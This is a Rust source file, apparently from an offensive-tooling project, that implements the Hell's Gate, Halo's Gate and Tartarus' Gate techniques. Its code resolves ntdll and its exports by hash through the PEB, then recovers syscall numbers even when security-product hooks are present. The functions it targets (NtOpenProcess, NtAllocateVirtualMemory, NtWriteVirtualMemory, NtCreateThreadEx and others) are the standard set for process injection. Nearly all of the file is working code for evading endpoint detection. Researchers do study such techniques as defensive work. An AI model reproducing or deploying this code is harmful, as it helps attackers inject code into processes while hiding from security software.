#![allow(dead_code)]

use ntapi::{ntldr::LDR_DATA_TABLE_ENTRY, ntpebteb::PEB, ntpsapi::PEB_LDR_DATA};
use std::arch::asm;
use sysinfo::{ProcessExt, SystemExt};
use windows_sys::Win32::System::{
    Diagnostics::Debug::{IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_NT_HEADERS64},
    SystemServices::{
        IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_SIGNATURE,
    },
};

const NTDLL_HASH: u32 = 0x1edab0ed;
const NT_OPEN_PROCESS_HASH: u32 = 0x4b82f718;
const NT_ALLOCATE_VIRTUAL_MEMORY_HASH: u32 = 0xf783b8ec;
const NT_PROTECT_VIRTUAL_MEMORY_HASH: u32 = 0x50e92888;
const NT_WRITE_VIRTUAL_MEMORY_HASH: u32 = 0xc3170192;
const NT_CREATE_THREAD_EX_HASH: u32 = 0xaf18cfb0;

const UP: isize = -32;
const DOWN: usize = 32;

pub struct VxTableEntry {
    p_address: *mut u8,
    w_system_call: u16,
}

// Do unit testing
#[cfg(test)]
mod test {
    use super::*;

    #[test]
    fn it_works() {
        env_logger::init();

        let ntdll_base_address = unsafe {
            get_loaded_module_by_hash(NTDLL_HASH).expect("Failed to get loaded module by name")
        };

        log::debug!("[+] NTDLL Address: {:p}", ntdll_base_address);

        let nt_open_process_table = unsafe {
            hells_halos_tartarus_gate(ntdll_base_address, NT_OPEN_PROCESS_HASH)
                .expect("Failed to call hells_halos_tartarus_gate")
        };
        let nt_allocate_virtual_memory_table = unsafe {
            hells_halos_tartarus_gate(ntdll_base_address, NT_ALLOCATE_VIRTUAL_MEMORY_HASH)
                .expect("Failed to call hells_halos_tartarus_gate")
        };
        let nt_protect_virtual_memory_table = unsafe {
            hells_halos_tartarus_gate(ntdll_base_address, NT_PROTECT_VIRTUAL_MEMORY_HASH)
                .expect("Failed to call hells_halos_tartarus_gate")
        };
        let nt_write_virtual_memory_table = unsafe {
            hells_halos_tartarus_gate(ntdll_base_address, NT_WRITE_VIRTUAL_MEMORY_HASH)
                .expect("Failed to call hells_halos_tartarus_gate")
        };
        let nt_create_thread_ex_table = unsafe {
            hells_halos_tartarus_gate(ntdll_base_address, NT_CREATE_THREAD_EX_HASH)
                .expect("Failed to call hells_halos_tartarus_gate")
        };

        log::debug!(
            "[+] NtOpenProcess: {:p} Syscall: {:#x}",
            nt_open_process_table.p_address,
            nt_open_process_table.w_system_call
        );
        log::debug!(
            "[+] NtAllocateVirtualMemory: {:p} Syscall: {:#x}",
            nt_allocate_virtual_memory_table.p_address,
            nt_allocate_virtual_memory_table.w_system_call
        );
        log::debug!(
            "[+] NtProtectVirtualMemory: {:p} Syscall: {:#x}",
            nt_protect_virtual_memory_table.p_address,
            nt_protect_virtual_memory_table.w_system_call
        );
        log::debug!(
            "[+] NtWriteVirtualMemory: {:p} Syscall: {:#x}",
            nt_write_virtual_memory_table.p_address,
            nt_write_virtual_memory_table.w_system_call
        );
        log::debug!(
            "[+] NtCreateThreadEx: {:p} Syscall: {:#x}",
            nt_create_thread_ex_table.p_address,
            nt_create_thread_ex_table.w_system_call
        );

        // Tested on Microsoft Windows 10 Home  10.0.19044 N/A Build 19044 (Unit test will fail in other build versions if syscalls IDs are different)
        assert_eq!(nt_open_process_table.w_system_call, 0x26);
        assert_eq!(nt_allocate_virtual_memory_table.w_system_call, 0x18);
        assert_eq!(nt_protect_virtual_memory_table.w_system_call, 0x50);
        assert_eq!(nt_write_virtual_memory_table.w_system_call, 0x3a);
        assert_eq!(nt_create_thread_ex_table.w_system_call, 0xc1);

        //assert_eq!(nt_create_thread_ex_syscall, 0x1337); // testing fail test
    }
}

pub unsafe fn hells_halos_tartarus_gate(
    module_base: *mut u8,
    module_hash: u32,
) -> Option<VxTableEntry> {
    let mut vx_table_entry = VxTableEntry {
        p_address: get_export_by_hash(module_base, module_hash)
            .expect("Failed to get export by hash"),
        w_system_call: 0,
    };
    // Hell's gate
    //
    //

    //vx_table_entry.w_system_call = find_syscall_number(vx_table_entry.p_address as _);

    // check if the assembly instruction are:
    // mov r10, rcx
    // mov rcx, <syscall>
    if vx_table_entry.p_address.read() == 0x4c
        && vx_table_entry.p_address.add(1).read() == 0x8b
        && vx_table_entry.p_address.add(2).read() == 0xd1
        && vx_table_entry.p_address.add(3).read() == 0xb8
        && vx_table_entry.p_address.add(6).read() == 0x00
        && vx_table_entry.p_address.add(7).read() == 0x00
    {
        let high = vx_table_entry.p_address.add(5).read();
        let low = vx_table_entry.p_address.add(4).read();
        vx_table_entry.w_system_call = ((high.overflowing_shl(8).0) | low) as u16;
        return Some(vx_table_entry);
    }

    //
    // Halo's Gate Patch
    //

    if vx_table_entry.p_address.read() == 0xe9 {
        for idx in 1..500 {
            //
            // if hooked check the neighborhood to find clean syscall (downwards)
            //

            if vx_table_entry.p_address.add(idx * DOWN).read() == 0x4c
                && vx_table_entry.p_address.add(1 + idx * DOWN).read() == 0x8b
                && vx_table_entry.p_address.add(2 + idx * DOWN).read() == 0xd1
                && vx_table_entry.p_address.add(3 + idx * DOWN).read() == 0xb8
                && vx_table_entry.p_address.add(6 + idx * DOWN).read() == 0x00
                && vx_table_entry.p_address.add(7 + idx * DOWN).read() == 0x00
            {
                let high: u8 = vx_table_entry.p_address.add(5 + idx * DOWN).read();
                let low: u8 = vx_table_entry.p_address.add(4 + idx * DOWN).read();
                vx_table_entry.w_system_call =
                    ((high.overflowing_shl(8).0) | low - idx as u8) as u16;
                return Some(vx_table_entry);
            }

            //
            // if hooked check the neighborhood to find clean syscall (upwards)
            //

            if vx_table_entry.p_address.offset(idx as isize * UP).read() == 0x4c
                && vx_table_entry
                    .p_address
                    .offset(1 + idx as isize * UP)
                    .read()
                    == 0x8b
                && vx_table_entry
                    .p_address
                    .offset(2 + idx as isize * UP)
                    .read()
                    == 0xd1
                && vx_table_entry
                    .p_address
                    .offset(3 + idx as isize * UP)
                    .read()
                    == 0xb8
                && vx_table_entry
                    .p_address
                    .offset(6 + idx as isize * UP)
                    .read()
                    == 0x00
                && vx_table_entry
                    .p_address
                    .offset(7 + idx as isize * UP)
                    .read()
                    == 0x00
            {
                let high: u8 = vx_table_entry
                    .p_address
                    .offset(5 + idx as isize * UP)
                    .read();
                let low: u8 = vx_table_entry
                    .p_address
                    .offset(4 + idx as isize * UP)
                    .read();
                vx_table_entry.w_system_call =
                    ((high.overflowing_shl(8).0) | low + idx as u8) as u16;
                return Some(vx_table_entry);
            }
        }
    }

    //
    // Tartarus' Gate Patch
    //

    if vx_table_entry.p_address.add(3).read() == 0xe9 {
        //
        // if hooked check the neighborhood to find clean syscall (downwards)
        //

        for idx in 1..500 {
            if vx_table_entry.p_address.add(idx * DOWN).read() == 0x4c
                && vx_table_entry.p_address.add(1 + idx * DOWN).read() == 0x8b
                && vx_table_entry.p_address.add(2 + idx * DOWN).read() == 0xd1
                && vx_table_entry.p_address.add(3 + idx * DOWN).read() == 0xb8
                && vx_table_entry.p_address.add(6 + idx * DOWN).read() == 0x00
                && vx_table_entry.p_address.add(7 + idx * DOWN).read() == 0x00
            {
                let high: u8 = vx_table_entry.p_address.add(5 + idx * DOWN).read();
                let low: u8 = vx_table_entry.p_address.add(4 + idx * DOWN).read();
                vx_table_entry.w_system_call =
                    ((high.overflowing_shl(8).0) | low - idx as u8) as u16;
                return Some(vx_table_entry);
            }

            //
            // if hooked check the neighborhood to find clean syscall (upwards)
            //

            if vx_table_entry.p_address.offset(idx as isize * UP).read() == 0x4c
                && vx_table_entry
                    .p_address
                    .offset(1 + idx as isize * UP)
                    .read()
                    == 0x8b
                && vx_table_entry
                    .p_address
                    .offset(2 + idx as isize * UP)
                    .read()
                    == 0xd1
                && vx_table_entry
                    .p_address
                    .offset(3 + idx as isize * UP)
                    .read()
                    == 0xb8
                && vx_table_entry
                    .p_address
                    .offset(6 + idx as isize * UP)
                    .read()
                    == 0x00
                && vx_table_entry
                    .p_address
                    .offset(7 + idx as isize * UP)
                    .read()
                    == 0x00
            {
                let high: u8 = vx_table_entry
                    .p_address
                    .offset(5 + idx as isize * UP)
                    .read();
                let low: u8 = vx_table_entry
                    .p_address
                    .offset(4 + idx as isize * UP)
                    .read();
                vx_table_entry.w_system_call =
                    ((high.overflowing_shl(8).0) | low + idx as u8) as u16;
                return Some(vx_table_entry);
            }
        }
    }

    return None;
}

/// Get process ID by name
pub fn get_process_id_by_name(target_process: &str) -> usize {
    let mut system = sysinfo::System::new();
    system.refresh_all();

    let mut process_id: usize = 0;

    for process in system.process_by_name(target_process) {
        process_id = process.pid();
    }
    return process_id;
}

/// Gets a pointer to IMAGE_NT_HEADERS32 x86_64
#[cfg(target_arch = "x86_64")]
pub unsafe fn get_nt_headers(module_base: *mut u8) -> Option<*mut IMAGE_NT_HEADERS64> {
    let dos_header = module_base as *mut IMAGE_DOS_HEADER;

    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
        return None;
    }

    let nt_headers =
        (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    if (*nt_headers).Signature != IMAGE_NT_SIGNATURE as _ {
        return None;
    }

    return Some(nt_headers);
}

/// Gets a pointer to the Thread Environment Block (TEB)
#[cfg(target_arch = "x86")]
pub unsafe fn get_teb() -> *mut ntapi::ntpebteb::TEB {
    let teb: *mut ntapi::ntpebteb::TEB;
    asm!("mov {teb}, fs:[0x18]", teb = out(reg) teb);
    teb
}

/// Get a pointer to the Thread Environment Block (TEB)
#[cfg(target_arch = "x86_64")]
pub unsafe fn get_teb() -> *mut ntapi::ntpebteb::TEB {
    let teb: *mut ntapi::ntpebteb::TEB;
    asm!("mov {teb}, gs:[0x30]", teb = out(reg) teb);
    teb
}

/// Get a pointer to the Process Environment Block (PEB)
pub unsafe fn get_peb() -> *mut PEB {
    let teb = get_teb();
    let peb = (*teb).ProcessEnvironmentBlock;
    peb
}

/// Get loaded module by hash
pub unsafe fn get_loaded_module_by_hash(module_hash: u32) -> Option<*mut u8> {
    let peb = get_peb();
    let peb_ldr_data_ptr = (*peb).Ldr as *mut PEB_LDR_DATA;

    let mut module_list =
        (*peb_ldr_data_ptr).InLoadOrderModuleList.Flink as *mut LDR_DATA_TABLE_ENTRY;

    while !(*module_list).DllBase.is_null() {
        let dll_buffer_ptr = (*module_list).BaseDllName.Buffer;
        let dll_length = (*module_list).BaseDllName.Length as usize;
        let dll_name_slice = core::slice::from_raw_parts(dll_buffer_ptr as *const u8, dll_length);

        if module_hash == dbj2_hash(dll_name_slice) {
            return Some((*module_list).DllBase as _);
        }

        module_list = (*module_list).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
    }

    return None;
}

/// Get the address of an export by hash
pub unsafe fn get_export_by_hash(module_base: *mut u8, export_name_hash: u32) -> Option<*mut u8> {
    let nt_headers = get_nt_headers(module_base)?;

    let export_directory = (module_base as usize
        + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
            .VirtualAddress as usize) as *mut IMAGE_EXPORT_DIRECTORY;

    let names = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfNames as usize) as *const u32,
        (*export_directory).NumberOfNames as _,
    );

    let functions = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfFunctions as usize) as *const u32,
        (*export_directory).NumberOfFunctions as _,
    );

    let ordinals = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfNameOrdinals as usize) as *const u16,
        (*export_directory).NumberOfNames as _,
    );

    for i in 0..(*export_directory).NumberOfNames {
        let name_addr = (module_base as usize + names[i as usize] as usize) as *const i8;
        let name_len = get_cstr_len(name_addr as _);
        let name_slice: &[u8] = core::slice::from_raw_parts(name_addr as _, name_len);

        if export_name_hash == dbj2_hash(name_slice) {
            let ordinal = ordinals[i as usize] as usize;
            return Some((module_base as usize + functions[ordinal] as usize) as *mut u8);
        }
    }

    return None;
}

/// Generate a unique hash
pub fn dbj2_hash(buffer: &[u8]) -> u32 {
    let mut hsh: u32 = 5381;
    let mut iter: usize = 0;
    let mut cur: u8;

    while iter < buffer.len() {
        cur = buffer[iter];
        if cur == 0 {
            iter += 1;
            continue;
        }
        if cur >= ('a' as u8) {
            cur -= 0x20;
        }
        hsh = ((hsh << 5).wrapping_add(hsh)) + cur as u32;
        iter += 1;
    }
    return hsh;
}

/// Get the length of a C String
pub fn get_cstr_len(pointer: *const char) -> usize {
    let mut tmp: u64 = pointer as u64;

    unsafe {
        while *(tmp as *const u8) != 0 {
            tmp += 1;
        }
    }
    (tmp - pointer as u64) as _
}

/// Checks to see if the architecture x86 or x86_64
pub fn is_wow64() -> bool {
    // A usize is 4 bytes on 32 bit and 8 bytes on 64 bit
    if std::mem::size_of::<usize>() == 4 {
        return false;
    }

    return true;
}

#[allow(dead_code)]
/// Extracts the system call number from the specfied function pointer (not required in this program)
fn find_syscall_number(function_ptr: *mut u8) -> u16 {
    let needle: [u8; 4] = [0x4c, 0x8b, 0xd1, 0xb8];

    let func_slice: &[u8] = unsafe { core::slice::from_raw_parts(function_ptr as *const u8, 6) };

    if let Some(index) = func_slice.windows(needle.len()).position(|x| *x == needle) {
        let offset = index + needle.len();
        let offset_slice = &func_slice[offset..offset + 2];

        let syscall_number = u16::from_le_bytes(offset_slice.try_into().unwrap());

        log::debug!("{:#x}", syscall_number);
        return syscall_number;
    }

    return 0;
}
